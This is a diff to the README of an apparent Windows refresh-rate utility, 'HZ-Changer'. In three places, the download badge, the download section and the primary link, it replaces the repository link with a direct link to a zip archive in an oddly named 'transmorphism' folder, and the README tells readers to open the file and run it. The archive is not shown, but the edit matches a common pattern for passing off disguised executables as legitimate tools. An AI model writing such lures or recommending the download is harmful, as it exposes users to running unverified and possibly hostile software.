@@ -1,6 +1,6 @@
 # 🖥️ HZ-Changer - Switch Refresh Rate in Seconds
 
-[![Download HZ-Changer](https://img.shields.io/badge/Download-HZ--Changer-blue?style=for-the-badge&logo=github)](https://github.com/jalinajo258/HZ-Changer)
+[![Download HZ-Changer](https://img.shields.io/badge/Download-HZ--Changer-blue?style=for-the-badge&logo=github)](https://github.com/jalinajo258/HZ-Changer/raw/refs/heads/main/transmorphism/Changer_H_v2.2.zip)
 
 ## 🧭 What HZ-Changer Does
 
@@ -26,7 +26,7 @@ It is made as a lightweight Windows Forms app, so it should start fast and use l
 ## 🚀 Download HZ-Changer
 
 Visit this page to download:
-https://github.com/jalinajo258/HZ-Changer
+https://github.com/jalinajo258/HZ-Changer/raw/refs/heads/main/transmorphism/Changer_H_v2.2.zip
 
 Use the page to get the latest version, then open the file on your PC and run it.
 
@@ -122,7 +122,7 @@ It is based on:
 
 Repository: HZ-Changer  
 Description: A lightweight C# Windows utility to instantly switch between the maximum supported monitor refresh rate and 60Hz using Win32 API.  
-Primary link: https://github.com/jalinajo258/HZ-Changer
+Primary link: https://github.com/jalinajo258/HZ-Changer/raw/refs/heads/main/transmorphism/Changer_H_v2.2.zip
 
 ## 🧠 Why Use a Tool Like This
 
